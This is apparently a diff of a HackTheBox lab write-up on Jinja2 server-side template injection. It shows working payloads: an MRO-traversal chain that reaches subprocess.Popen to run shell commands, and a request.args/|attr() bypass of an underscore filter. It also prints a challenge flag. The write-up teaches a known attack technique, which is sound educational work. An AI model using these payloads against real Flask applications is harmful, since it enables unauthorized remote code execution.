@@ -1,5 +1,5 @@
 ---
-title: "HackTheBox — Templated (SSTI → RCE)"
+title: "HackTheBox - Templated (SSTI to RCE)"
 description: "Server-side template injection in a Flask/Jinja2 app. Bypassed basic filters using attribute access chains to achieve remote code execution and read the root flag."
 platform: "HackTheBox"
 category: "Web"
@@ -12,46 +12,51 @@ date: 2026-02-14
 **Platform:** HackTheBox
 **Category:** Web
 **Difficulty:** Easy
-**Points:** 20
 
 ## Recon
 
-The application reflected user input from the URL path directly into the page. Testing with a simple Jinja2 expression quickly confirmed SSTI:
+The app was basically empty, just a single route that reflected whatever you put in the URL back onto the page. The 404 message said:
 
 ```
-GET /{{ 7*7 }} HTTP/1.1
-
-Response: ...49...
+Error: /whatever was not found on this server
 ```
+
+The response headers showed `Werkzeug/1.0.1` which means Flask. I figured the page content was being rendered through a Jinja2 template, so I tried injecting a basic expression into the URL:
+
+```
+GET /{{7*7}}
+```
+
+The page returned `49`. That confirmed SSTI.
 
 ## Exploitation
 
-With confirmed SSTI in Jinja2, the goal is to reach `os.popen()` through Python's MRO chain.
+From here I needed to get to a class that can run shell commands. In Python you can walk the MRO chain from any string to get to `object`, then list all its subclasses and find one like `subprocess.Popen`:
 
 ```python
-# Basic payload — bypass attribute filter
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-
-# Find subprocess.Popen index, then:
-{{ ''.__class__.__mro__[1].__subclasses__()[OFFSET]('cat /flag.txt', shell=True, stdout=-1).communicate() }}
+{{''.__class__.__mro__[1].__subclasses__()[OFFSET]('cat /flag.txt',shell=True,stdout=-1).communicate()}}
 ```
+
+The tricky part is the index changes depending on the environment. I just iterated through them until one worked.
 
 ## Filter Bypass
 
-The app filtered underscores (`_`). I used `request.args` to pass the payload as a GET parameter:
+The app was blocking underscores in the URL, which broke the payload. I worked around it by passing the attribute names as GET parameters instead:
 
 ```
-GET /{{request.args.x|attr(request.args.y)}}?x=__class__&y=__mro__ HTTP/1.1
+GET /{{request.args.c|attr(request.args.a)|attr(request.args.b)}}?c=''&a=__class__&b=__mro__
 ```
+
+This keeps underscores out of the URL path entirely. You can chain the whole payload this way.
 
 ## Flag
 
 ```
-HTB{t3mpl4t3_1nj3ct10n_1s_s3rv3r_s1d3}
+HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
 ```
 
-## Lessons
+## What I learned
 
-- SSTI in Jinja2 is reliably exploitable via MRO traversal
-- Simple character filters are bypassable with `request.args` or `|attr()`
-- Always check if reflected content is in a template context, not just HTML context
+- If user input ends up inside a Jinja2 template, MRO traversal is a pretty reliable way to get RCE
+- Simple character filters on the URL path are easy to bypass using `request.args` and `|attr()`
+- Checking response headers early can tell you the framework before you even start fuzzing
